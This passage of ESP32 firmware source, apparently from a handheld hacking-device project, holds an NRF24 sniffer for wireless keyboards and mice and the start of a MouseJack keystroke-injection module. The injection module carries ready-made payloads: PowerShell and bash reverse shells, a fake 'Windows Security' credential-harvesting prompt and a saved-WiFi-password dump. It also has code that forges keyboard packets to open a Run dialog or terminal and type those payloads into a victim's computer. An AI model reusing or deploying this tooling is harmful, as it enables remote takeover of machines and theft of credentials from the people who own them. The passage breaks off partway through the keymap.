    if (snPacketCount < SN_MAX_PACKETS) {
        int idx = snPacketCount;
        memset(&snPackets[idx], 0, sizeof(SniffedPacket));
        memcpy(snPackets[idx].addr, addr, addrLen);
        snPackets[idx].addrLen = addrLen;
        snPacketCount++;
        return idx;
    }
    // Ring buffer: overwrite oldest (index 0), shift down
    memmove(&snPackets[0], &snPackets[1], sizeof(SniffedPacket) * (SN_MAX_PACKETS - 1));
    int idx = SN_MAX_PACKETS - 1;
    memset(&snPackets[idx], 0, sizeof(SniffedPacket));
    memcpy(snPackets[idx].addr, addr, addrLen);
    snPackets[idx].addrLen = addrLen;
    return idx;
}

// ── Core 0 RX task ────────────────────────────────────────────────────────
static void snRxTask(void* param) {
    // Reinit SPI on Core 0
    SPI.end();
    delay(5);
    SPI.begin(18, 19, 23);
    SPI.setFrequency(8000000);

    // Configure NRF24 for promiscuous mode (raw SPI)
    pinMode(NRF_CE, OUTPUT);
    pinMode(NRF_CSN, OUTPUT);
    digitalWrite(NRF_CE, LOW);
    digitalWrite(NRF_CSN, HIGH);

    // Deselect other SPI devices
    #ifndef NMRF_HAT
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    #endif
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);

    delay(10);

    // Power up
    snWriteReg(_NRF24_CONFIG, 0x02);  // PWR_UP
    delayMicroseconds(1500);

    // Promiscuous config
    snWriteReg(_NRF24_SETUP_AW, 0x00);    // 2-byte illegal address width
    snWriteReg(_NRF24_EN_AA, 0x00);        // No auto-ack
    snWriteReg(_NRF24_EN_RXADDR, 0x03);    // Pipes 0+1
    snWriteReg(_NRF24_RF_SETUP, 0x09);     // 2Mbps, -6dBm
    snWriteReg(0x11, 32);                   // RX_PW_P0 = 32
    snWriteReg(0x12, 32);                   // RX_PW_P1 = 32

    // Address patterns for preamble catch
    const uint8_t a0[] = {0xAA, 0x55};
    const uint8_t a1[] = {0x55, 0xAA};
    snWriteRegMulti(_NRF24_RX_ADDR_P0, a0, 2);
    snWriteRegMulti(_NRF24_RX_ADDR_P1, a1, 2);

    snFlushRx();
    snWriteReg(0x07, 0x70);  // Clear IRQ flags

    // RX mode, CRC disabled, power up
    snWriteReg(_NRF24_CONFIG, 0x03);
    delayMicroseconds(1500);
    digitalWrite(NRF_CE, HIGH);
    delayMicroseconds(130);

    #if CYD_DEBUG
    Serial.println("[SNIFFER] Core 0: Promiscuous RX active");
    #endif

    uint8_t rxBuf[32];
    uint8_t ch = 0;
    int yieldCounter = 0;

    while (snTaskRunning) {
        if (!snScanning) {
            vTaskDelay(20);
            continue;
        }

        // Channel hop (or stay locked)
        if (!snChannelLock) {
            ch++;
            if (ch > 125) ch = 0;
        } else {
            ch = snLockedChannel;
        }
        snWriteReg(_NRF24_RF_CH, ch);
        snCurrentCh = ch;
        delayMicroseconds(SN_HOP_DWELL_US);

        // Read all available packets from FIFO
        for (int reads = 0; reads < 3; reads++) {
            int n = snReadPayload(rxBuf, 32);
            if (n == 0) break;

            snTotalFrames++;

            // Noise filter
            if (isNoise(rxBuf, n)) continue;

            // Extract address: first 5 bytes of raw payload
            // In Goodspeed mode, the "address" of the actual transmitter
            // is the first 3-5 bytes after the preamble match
            uint8_t addr[5];
            memcpy(addr, rxBuf, 5);
            uint8_t addrLen = 5;

            // Detect frame type (byte after address area)
            uint8_t frameType = (n > 5) ? rxBuf[5] : 0x00;

            // Find or create entry
            int idx = findOrCreatePacket(addr, addrLen);
            snPackets[idx].channel = ch;
            snPackets[idx].frameType = frameType;
            snPackets[idx].hitCount++;
            snPackets[idx].rpd = (snReadReg(_NRF24_RPD) & 0x01);
            memcpy(snPackets[idx].raw, rxBuf, n);
            snPackets[idx].rawLen = n;
        }

        yieldCounter++;
        if (yieldCounter >= 200) {
            yieldCounter = 0;
            vTaskDelay(1);
        }
    }

    // Cleanup — MUST restore SETUP_AW before exit!
    // Promiscuous mode sets SETUP_AW=0x00 (illegal 2-byte).
    // NRF24 retains register state across ESP32 reset (no power cycle).
    // Boot firmware check reads SETUP_AW → 0x00 → "wrong firmware" warning.
    digitalWrite(NRF_CE, LOW);
    snWriteReg(_NRF24_SETUP_AW, 0x03);  // Restore 5-byte address width (DEFAULT)
    snWriteReg(_NRF24_CONFIG, 0x00);     // Power down
    nrf24ExitPromiscuous();              // Full RF24 library restore

    #if CYD_DEBUG
    Serial.println("[SNIFFER] Core 0: RX task exiting, SETUP_AW restored");
    #endif

    snTaskHandle = NULL;
    snTaskDone = true;
    vTaskDelete(NULL);
}

static void startSnTask() {
    if (snTaskHandle != NULL) return;
    snTaskRunning = true;
    snTaskDone = false;
    xTaskCreatePinnedToCore(snRxTask, "NrfSniff", 6144, NULL, 1, &snTaskHandle, 0);
}

static void stopSnTask() {
    if (snTaskHandle == NULL) return;
    snTaskRunning = false;
    unsigned long start = millis();
    while (!snTaskDone && millis() - start < 500) delay(10);
    snTaskHandle = NULL;
}

// ── Icon bar ──────────────────────────────────────────────────────────────
#define SN_ICON_NUM 4
static const int snIconX[SN_ICON_NUM] = {SCALE_X(90), SCALE_X(130), SCALE_X(170), 10};
static const unsigned char* const snIcons[SN_ICON_NUM] = {
    bitmap_icon_start,     // Start/Stop scan
    bitmap_icon_undo,      // Channel lock toggle
    bitmap_icon_RIGHT,     // Scroll down
    bitmap_icon_go_back    // Back
};
static int snSkullFrame = 0;

static void drawSnIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < SN_ICON_NUM; i++) {
        tft.drawBitmap(snIconX[i], ICON_BAR_Y, snIcons[i], 16, 16, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// ── Detect frame type label ───────────────────────────────────────────────
static const char* getFrameLabel(uint8_t ft) {
    switch (ft) {
        case 0x00: return "WAKE";
        case 0xC1: return "KEY ";
        case 0xC2: return "MOUS";
        case 0x0A: return "MS  ";
        case 0x4F: return "PAIR";
        case 0x0F: return "HID ";
        default:   return "RAW ";
    }
}

// ── Skull row references (Jesse's custom 16x16 skulls from icon.h) ────────
static const unsigned char* const snSkulls[SN_SKULL_NUM] = {
    bitmap_icon_skull_wifi, bitmap_icon_skull_bluetooth, bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz, bitmap_icon_skull_ir, bitmap_icon_skull_tools,
    bitmap_icon_skull_setting, bitmap_icon_skull_about
};

// ── Header (title + status) ──────────────────────────────────────────────
static void drawSnHeader() {
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCALE_Y(50), TFT_BLACK);

    drawGlitchText(SCALE_Y(55), "NRF SNIFFER", &Nosifer_Regular10pt7b);

    if (snScanning) {
        drawGlitchStatus(SCALE_Y(72), "SCANNING", HALEHOUND_HOTPINK);
    } else {
        drawGlitchStatus(SCALE_Y(72), "STANDBY", HALEHOUND_GUNMETAL);
    }

    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, SCALE_Y(78));
    tft.printf("CH:%s  DEV:%d",
        snChannelLock ? String(snLockedChannel).c_str() : "ALL",
        (int)snPacketCount);

    tft.drawLine(0, SCALE_Y(88), SCREEN_WIDTH, SCALE_Y(88), HALEHOUND_HOTPINK);
}

// ── Draw skull row ───────────────────────────────────────────────────────
static void drawSnSkulls() {
    int skullStartX = 10;
    int skullSpacing = SCALE_X(28);

    for (int i = 0; i < SN_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, SN_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (snScanning) {
            int phase = (snSkullFrame + i) % 8;
            if (phase < 4) {
                float ratio = phase / 3.0f;
                uint8_t r = (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }
        tft.drawBitmap(x, SN_SKULL_Y, snSkulls[i], 16, 16, color);
    }

    int labelX = skullStartX + (SN_SKULL_NUM * skullSpacing) + 5;
    tft.fillRect(labelX, SN_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor(snScanning ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(labelX, SN_SKULL_Y + 4);
    tft.print(snScanning ? "RX!" : "OFF");

    snSkullFrame++;
}

// ── Draw packet list ──────────────────────────────────────────────────────
static void drawPacketList() {
    int tableTop = SCALE_Y(92);
    int rowH = SCALE_Y(22);

    // Table header
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, tableTop);
    tft.print("ADDR              CH TYPE  #");
    tft.drawLine(10, tableTop + 10, SCREEN_WIDTH - 10, tableTop + 10, HALEHOUND_HOTPINK);

    int startY = tableTop + 14;

    // Packet rows
    for (int i = 0; i < SN_DISPLAY_ROWS; i++) {
        int pktIdx = snScrollOffset + i;
        int y = startY + (i * rowH);

        tft.fillRect(5, y, SCREEN_WIDTH - 10, rowH - 1, TFT_BLACK);

        if (pktIdx >= snPacketCount) continue;

        SniffedPacket& pkt = snPackets[pktIdx];

        // Highlight selected row
        if (i == snSelectedRow) {
            tft.fillRect(5, y, SCREEN_WIDTH - 10, rowH - 1, HALEHOUND_DARK);
        }

        // Address
        tft.setTextColor(HALEHOUND_BRIGHT, (i == snSelectedRow) ? HALEHOUND_DARK : TFT_BLACK);
        tft.setCursor(8, y + 3);
        for (int b = 0; b < pkt.addrLen; b++) {
            tft.printf("%02X", pkt.addr[b]);
            if (b < pkt.addrLen - 1) tft.print(":");
        }

        // Channel
        uint16_t bg = (i == snSelectedRow) ? HALEHOUND_DARK : TFT_BLACK;
        tft.setTextColor(HALEHOUND_CYAN, bg);
        tft.setCursor(SCALE_X(148), y + 3);
        tft.printf("%3d", pkt.channel);

        // Frame type
        tft.setTextColor(HALEHOUND_HOTPINK, bg);
        tft.setCursor(SCALE_X(172), y + 3);
        tft.print(getFrameLabel(pkt.frameType));

        // Hit count
        tft.setTextColor(HALEHOUND_MAGENTA, bg);
        tft.setCursor(SCALE_X(208), y + 3);
        tft.printf("%d", pkt.hitCount);

        // RPD indicator
        if (pkt.rpd) {
            tft.fillCircle(SCALE_X(232), y + 6, 2, HALEHOUND_HOTPINK);
        }
    }

    // Status bar below table
    int statusY = startY + (SN_DISPLAY_ROWS * rowH) + 2;
    tft.drawLine(5, statusY, SCREEN_WIDTH - 5, statusY, HALEHOUND_VIOLET);
    statusY += 4;
    tft.fillRect(0, statusY, SCREEN_WIDTH, 12, TFT_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(10, statusY);
    tft.printf("DEV:%d  FRAMES:%lu  CH:%s",
        (int)snPacketCount, snTotalFrames,
        snChannelLock ? String(snLockedChannel).c_str() : "ALL");

    if (snScanning) {
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setCursor(SCALE_X(195), statusY);
        tft.print("SCAN");
    }

    // Skull row
    drawSnSkulls();
}

// ── Draw detail view (hex dump + USE FOR MOUSEJACK) ───────────────────────
static void drawDetailView() {
    if (snSelectedRow < 0 || snScrollOffset + snSelectedRow >= snPacketCount) return;

    SniffedPacket& pkt = snPackets[snScrollOffset + snSelectedRow];

    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCREEN_HEIGHT - CONTENT_Y_START, TFT_BLACK);

    int y = CONTENT_Y_START + 4;

    // Title
    drawGlitchText(SCALE_Y(55), "PACKET DETAIL", &Nosifer_Regular10pt7b);
    y = SCALE_Y(64);

    // Rounded frame for address info
    int frameY = y;
    int frameH = SCALE_H(52);
    tft.drawRoundRect(10, frameY, CONTENT_INNER_W, frameH, 6, HALEHOUND_VIOLET);
    tft.drawRoundRect(11, frameY + 1, CONTENT_INNER_W - 2, frameH - 2, 5, HALEHOUND_GUNMETAL);

    y = frameY + 8;
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(18, y);
    tft.print("ADDR: ");
    tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
    for (int b = 0; b < pkt.addrLen; b++) {
        tft.printf("%02X", pkt.addr[b]);
        if (b < pkt.addrLen - 1) tft.print(":");
    }
    y += 14;

    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(18, y);
    tft.printf("CH:%d  TYPE:%s  HITS:%d  RPD:%s",
        pkt.channel, getFrameLabel(pkt.frameType),
        pkt.hitCount, pkt.rpd ? "Y" : "N");
    y += 14;

    y = frameY + frameH + 6;
    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
    y += 6;

    // Hex dump
    tft.setTextColor(HALEHOUND_CYAN, TFT_BLACK);
    tft.setCursor(10, y);
    tft.print("RAW HEX:");
    y += 12;

    for (int row = 0; row < 4 && row * 8 < pkt.rawLen; row++) {
        tft.setCursor(10, y);
        tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        tft.printf("%02X: ", row * 8);
        for (int col = 0; col < 8; col++) {
            int idx = row * 8 + col;
            if (idx < pkt.rawLen) {
                tft.setTextColor(HALEHOUND_BRIGHT, TFT_BLACK);
                tft.printf("%02X ", pkt.raw[idx]);
            }
        }
        y += 11;
    }

    y += 6;
    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
    y += 6;

    // USE FOR MOUSEJACK button
    int btnX = 20;
    int btnW = SCREEN_WIDTH - 40;
    int btnH = SCALE_H(24);
    tft.fillRoundRect(btnX, y, btnW, btnH, 5, HALEHOUND_DARK);
    tft.drawRoundRect(btnX, y, btnW, btnH, 5, HALEHOUND_HOTPINK);
    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_DARK);
    tft.setTextSize(1);
    int textW = 19 * 6;
    tft.setCursor(btnX + (btnW - textW) / 2, y + (btnH - 8) / 2);
    tft.print("USE FOR MOUSEJACK");

    // BACK button
    y += btnH + 6;
    tft.fillRoundRect(btnX, y, btnW, btnH, 5, HALEHOUND_DARK);
    tft.drawRoundRect(btnX, y, btnW, btnH, 5, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_DARK);
    int backW = 4 * 6;
    tft.setCursor(btnX + (btnW - backW) / 2, y + (btnH - 8) / 2);
    tft.print("BACK");
}

// ── Setup ─────────────────────────────────────────────────────────────────
void setup() {
    snExitRequested = false;
    snScanning = false;
    snUiDrawn = false;
    snScrollOffset = 0;
    snSelectedRow = -1;
    snDetailView = false;
    snChannelLock = false;
    snLockedChannel = 0;
    snPacketCount = 0;
    snTotalFrames = 0;

    // Heap-allocate packet buffer to save DRAM (.bss)
    if (snPackets) { free(snPackets); snPackets = nullptr; }
    snPackets = (SniffedPacket*)calloc(SN_MAX_PACKETS, sizeof(SniffedPacket));
    if (!snPackets) {
        tft.fillScreen(TFT_BLACK);
        drawCenteredText(120, "HEAP ALLOC FAILED", HALEHOUND_HOTPINK, 2);
        return;
    }

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawSnIconBar();

    // NRF24 init check
    if (!nrfInit()) {
        drawGlitchText(SCALE_Y(55), "NRF SNIFFER", &Nosifer_Regular10pt7b);
        drawCenteredText(100, "NRF24 NOT FOUND", HALEHOUND_HOTPINK, 2);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, ("CE=GPIO" + String(NRF24_CE) + " CSN=GPIO" + String(NRF24_CSN)).c_str(), HALEHOUND_MAGENTA, 1);
        return;
    }

    snScanning = true;
    snSkullFrame = 0;
    startSnTask();

    drawSnHeader();
    drawPacketList();

    snUiDrawn = true;

    #if CYD_DEBUG
    Serial.println("[SNIFFER] Setup complete, Core 0 task launched");
    #endif
}

// ── Loop ──────────────────────────────────────────────────────────────────
void loop() {
    if (!snUiDrawn) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            snExitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (snDetailView) {
            // Detail view touch handling
            SniffedPacket& pkt = snPackets[snScrollOffset + snSelectedRow];

            // "USE FOR MOUSEJACK" button region
            // Layout: title(64) + frame(52+6) + sep(12) + hexLabel(12) + 4 rows(44) + sep(12)
            int frameH = SCALE_H(52);
            int btnY1 = SCALE_Y(64) + frameH + 6 + 6 + 12 + (4 * 11) + 6 + 6;
            int btnH = SCALE_H(24);
            int btnX = 20;
            int btnW = SCREEN_WIDTH - 40;

            if (tx >= btnX && tx <= btnX + btnW && ty >= btnY1 && ty <= btnY1 + btnH) {
                // Copy address to MouseJack target
                memset(mouseJackerTarget, 0, 5);
                memcpy(mouseJackerTarget, pkt.addr, min((int)pkt.addrLen, 5));
                mouseJackerChannel = pkt.channel;
                mouseJackerDeviceType = pkt.frameType;
                waitForTouchRelease();
                delay(200);

                // Flash confirmation
                tft.fillRoundRect(btnX, btnY1, btnW, btnH, 5, HALEHOUND_HOTPINK);
                tft.setTextColor(TFT_BLACK, HALEHOUND_HOTPINK);
                tft.setTextSize(1);
                tft.setCursor(btnX + 30, btnY1 + (btnH - 8) / 2);
                tft.print("ADDRESS COPIED!");
                delay(800);

                // Return to list
                snDetailView = false;
                snSelectedRow = -1;
                tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCREEN_HEIGHT - CONTENT_Y_START, TFT_BLACK);
                return;
            }

            // BACK button
            int btnY2 = btnY1 + btnH + 8;
            if (tx >= btnX && tx <= btnX + btnW && ty >= btnY2 && ty <= btnY2 + btnH) {
                waitForTouchRelease();
                delay(200);
                snDetailView = false;
                snSelectedRow = -1;
                tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCREEN_HEIGHT - CONTENT_Y_START, TFT_BLACK);
                return;
            }
            return;
        }

        // Icon bar touch
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back
            if (tx < 40) {
                snExitRequested = true;
                return;
            }
            // Start/Stop
            if (tx >= snIconX[0] - 10 && tx < snIconX[0] + 25) {
                waitForTouchRelease();
                delay(200);
                snScanning = !snScanning;
                if (snScanning) startSnTask(); else stopSnTask();
                drawSnHeader();
                return;
            }
            // Channel lock toggle
            if (tx >= snIconX[1] - 10 && tx < snIconX[1] + 25) {
                waitForTouchRelease();
                delay(200);
                snChannelLock = !snChannelLock;
                if (snChannelLock) snLockedChannel = snCurrentCh;
                drawSnHeader();
                return;
            }
            // Scroll down
            if (tx >= snIconX[2] - 10 && tx < snIconX[2] + 25) {
                waitForTouchRelease();
                delay(150);
                if (snScrollOffset + SN_DISPLAY_ROWS < snPacketCount) {
                    snScrollOffset++;
                }
                return;
            }
        }

        // Tap on packet row → detail view
        int listStartY = SCALE_Y(92) + 14;  // tableTop + header height
        int rowH = SCALE_Y(22);
        if (ty >= listStartY && ty < listStartY + (SN_DISPLAY_ROWS * rowH)) {
            int tappedRow = (ty - listStartY) / rowH;
            int pktIdx = snScrollOffset + tappedRow;
            if (pktIdx < snPacketCount) {
                waitForTouchRelease();
                delay(200);
                snSelectedRow = tappedRow;
                snDetailView = true;
                drawDetailView();
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        snExitRequested = true;
        return;
    }

    // Update display at 5 Hz
    if (!snDetailView && millis() - snLastDisplayUpdate >= 200) {
        drawPacketList();
        snLastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return snExitRequested;
}

void cleanup() {
    snScanning = false;
    stopSnTask();
    if (snPackets) { free(snPackets); snPackets = nullptr; }
    snExitRequested = false;
    snUiDrawn = false;
    snPacketCount = 0;
    snTotalFrames = 0;
}

}  // namespace NrfSniffer


// ═══════════════════════════════════════════════════════════════════════════
// MOUSEJACK - Wireless Keyboard Keystroke Injection
// Injects into Logitech Unifying, Dell, Microsoft 2.4GHz keyboards
// Ref: Bastille Research, Marc Newlin nrf-research-firmware, nRF24-Playset
// ═══════════════════════════════════════════════════════════════════════════

namespace MouseJack {

// ── Payload definitions ───────────────────────────────────────────────────
#define MJ_MAX_PAYLOAD_LEN 256

enum MjPayloadType {
    MJ_REVSHELL_PS = 0,    // PowerShell reverse shell
    MJ_REVSHELL_BASH,      // Bash reverse shell
    MJ_CRED_HARVEST,       // Credential harvester
    MJ_WIFI_EXFIL,         // WiFi password dump
    MJ_CUSTOM_STRING,      // User-entered text
    MJ_PAYLOAD_COUNT       // 5
};

static const char* const MJ_PAYLOAD_NAMES[] = {
    "RevShell PS",
    "RevShell Bash",
    "Cred Harvest",
    "WiFi Exfil",
    "Custom Text"
};

// Pre-built payload strings (PROGMEM for flash storage)
// Reverse Shell (PowerShell): Win+R → powershell one-liner
static const char MJ_PS_REVSHELL[] PROGMEM =
    "powershell -NoP -W Hidden -Exec Bypass -C "
    "\"$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);"
    "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
    "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1|Out-String);"
    "$t=[text.encoding]::ASCII.GetBytes($r);"
    "$s.Write($t,0,$t.Length)}\"";

// Reverse Shell (Bash): Ctrl+Alt+T → bash one-liner
static const char MJ_BASH_REVSHELL[] PROGMEM =
    "bash -i >& /dev/tcp/LHOST/LPORT 0>&1";

// Credential Harvester: PowerShell fake login
static const char MJ_CRED_HARVEST_CMD[] PROGMEM =
    "powershell -W Hidden -C "
    "\"Add-Type -A System.Windows.Forms;"
    "$f=New-Object Windows.Forms.Form;"
    "$f.Text='Windows Security';"
    "$f.Size='350,200';"
    "$l=New-Object Windows.Forms.Label;"
    "$l.Text='Enter credentials:';"
    "$l.Location='20,20';"
    "$u=New-Object Windows.Forms.TextBox;"
    "$u.Location='20,50';$u.Width=290;"
    "$p=New-Object Windows.Forms.TextBox;"
    "$p.Location='20,80';$p.Width=290;"
    "$p.PasswordChar='*';"
    "$b=New-Object Windows.Forms.Button;"
    "$b.Text='OK';$b.Location='120,120';"
    "$b.Add_Click({$f.Tag=$u.Text+':'+$p.Text;$f.Close()});"
    "$f.Controls.AddRange(@($l,$u,$p,$b));"
    "$f.ShowDialog()|Out-Null;"
    "$f.Tag|Out-File $env:TEMP\\c.txt\"";

// WiFi Exfil: netsh dump saved WiFi passwords
static const char MJ_WIFI_EXFIL_CMD[] PROGMEM =
    "powershell -W Hidden -C "
    "\"netsh wlan show profiles|"
    "Select-String ':\\s(.+)$'|"
    "ForEach{$n=$_.Matches.Groups[1].Value.Trim();"
    "$p=(netsh wlan show profile $n key=clear|"
    "Select-String 'Key Content\\s+:\\s(.+)$').Matches.Groups[1].Value;"
    "\\\"$n : $p\\\"}|Out-File $env:TEMP\\w.txt\"";

// ── State ─────────────────────────────────────────────────────────────────
struct MjState {
    uint8_t targetAddr[5];
    bool    hasTarget;
    int     selectedPayload;
    bool    injecting;
    bool    scanning;
    int     keystrokesTotal;
    int     keystrokesSent;
    int     packetsOk;
    int     packetsFail;
    char    customString[MJ_MAX_PAYLOAD_LEN];
    int     customLen;
    uint8_t targetChannel;
    uint8_t deviceType;        // 0xC1=keyboard, 0xC2=mouse, 0x0F=HID
    bool    testOk;            // last test keystroke result
    unsigned long testTime;    // millis() of last test (for 1.5s flash)
};

static const char* getDeviceTypeStr(uint8_t dt) {
    switch (dt) {
        case 0xC1: return "KEYBOARD";
        case 0xC2: return "MOUSE";
        case 0x0F: return "HID DEVICE";
        default:   return "UNKNOWN";
    }
}

static MjState* mj = nullptr;
static bool mjExitRequested = false;
static bool mjUiDrawn = false;
static unsigned long mjLastDisplay = 0;

// ── Dual-core injection task ──────────────────────────────────────────────
static TaskHandle_t mjTaskHandle = NULL;
static volatile bool mjTaskRunning = false;
static volatile bool mjTaskDone = false;

static void mjTxTask(void* param) {
    MjState* st = (MjState*)param;

    // Reinit SPI on Core 0
    SPI.end();
    delay(5);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    delay(5);

    if (!nrf24Radio.begin()) {
        Serial.println("[MOUSEJACK] Core 0: NRF24 begin() FAILED");
        mjTaskDone = true;
        vTaskDelete(NULL);
        return;
    }

    // Configure for Logitech Unifying injection
    // Auto-ack OFF — receiver won't ACK spoofed packets from unpaired transmitter
    // TX success = packet transmitted. Verify injection visually on target screen.
    nrf24Radio.setAutoAck(false);
    nrf24Radio.setDataRate(RF24_2MBPS);
    nrf24Radio.setCRCLength(RF24_CRC_16);
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.setPayloadSize(10);
    nrf24Radio.openWritingPipe(st->targetAddr);
    nrf24Radio.stopListening();

    if (st->targetChannel > 0 && st->targetChannel <= 125) {
        nrf24Radio.setChannel(st->targetChannel);
    }

    Serial.printf("[MOUSEJACK] Core 0: TX ready, target=%02X:%02X:%02X:%02X:%02X ch=%d\n",
        st->targetAddr[0], st->targetAddr[1], st->targetAddr[2],
        st->targetAddr[3], st->targetAddr[4], st->targetChannel);

    // Get the payload string
    char payloadBuf[MJ_MAX_PAYLOAD_LEN];
    const char* payload = nullptr;

    switch (st->selectedPayload) {
        case MJ_REVSHELL_PS:
            strncpy_P(payloadBuf, MJ_PS_REVSHELL, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;
        case MJ_REVSHELL_BASH:
            strncpy_P(payloadBuf, MJ_BASH_REVSHELL, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;
        case MJ_CRED_HARVEST:
            strncpy_P(payloadBuf, MJ_CRED_HARVEST_CMD, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;
        case MJ_WIFI_EXFIL:
            strncpy_P(payloadBuf, MJ_WIFI_EXFIL_CMD, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;
        case MJ_CUSTOM_STRING:
            payload = st->customString;
            break;
        default:
            payload = "echo SPANDECK";
            break;
    }

    st->keystrokesTotal = strlen(payload);
    st->keystrokesSent = 0;
    st->packetsOk = 0;
    st->packetsFail = 0;

    // Pre-sequence: open Run dialog (Win+R) for PowerShell payloads
    if (st->selectedPayload == MJ_REVSHELL_PS ||
        st->selectedPayload == MJ_CRED_HARVEST ||
        st->selectedPayload == MJ_WIFI_EXFIL) {
        // GUI + R
        uint8_t pkt[10] = {0x00, 0xC1, 0x08, 0x00, 0x15, 0, 0, 0, 0, 0};  // GUI=0x08, r=0x15
        uint8_t lrc = 0;
        for (int i = 0; i < 9; i++) lrc ^= pkt[i];
        pkt[9] = lrc;
        nrf24Radio.write(pkt, 10);
        delay(5);
        // Release
        memset(pkt + 2, 0, 7);
        lrc = 0;
        for (int i = 0; i < 9; i++) lrc ^= pkt[i];
        pkt[9] = lrc;
        nrf24Radio.write(pkt, 10);
        delay(500);  // Wait for Run dialog to open
    }
    // Bash reverse shell: Ctrl+Alt+T to open terminal
    else if (st->selectedPayload == MJ_REVSHELL_BASH) {
        // Ctrl+Alt+T = 0x01|0x04 = 0x05, key T = 0x17
        uint8_t pkt[10] = {0x00, 0xC1, 0x05, 0x00, 0x17, 0, 0, 0, 0, 0};
        uint8_t lrc = 0;
        for (int i = 0; i < 9; i++) lrc ^= pkt[i];
        pkt[9] = lrc;
        nrf24Radio.write(pkt, 10);
        delay(5);
        memset(pkt + 2, 0, 7);
        lrc = 0;
        for (int i = 0; i < 9; i++) lrc ^= pkt[i];
        pkt[9] = lrc;
        nrf24Radio.write(pkt, 10);
        delay(800);  // Wait for terminal to open
    }

    // Inject payload string character by character
    while (mjTaskRunning && st->keystrokesSent < st->keystrokesTotal) {
        char c = payload[st->keystrokesSent];
        uint8_t key = 0, mod = 0;

        // Same keymap as nrf24InjectString
        if (c >= 'a' && c <= 'z') { key = 0x04 + (c - 'a'); }
        else if (c >= 'A' && c <= 'Z') { key = 0x04 + (c - 'A'); mod = 0x02; }
        else if (c >= '1' && c <= '9') { key = 0x1E + (c - '1'); }
        else if (c == '0') { key = 0x27; }
        else {
            switch (c) {
                case ' ':  key = 0x2C; break;
                case '\n': key = 0x28; break;
                case '\t': key = 0x2B; break;
                case '-':  key = 0x2D; break;
                case '=':  key = 0x2E; break;
                case '[':  key = 0x2F; break;
                case ']':  key = 0x30; break;
                case '\\': key = 0x31; break;
                case ';':  key = 0x33; break;
                case '\'': key = 0x34; break;
                case '`':  key = 0x35; break;
                case ',':  key = 0x36; break;
                case '.':  key = 0x37; break;
                case '/':  key = 0x38; break;
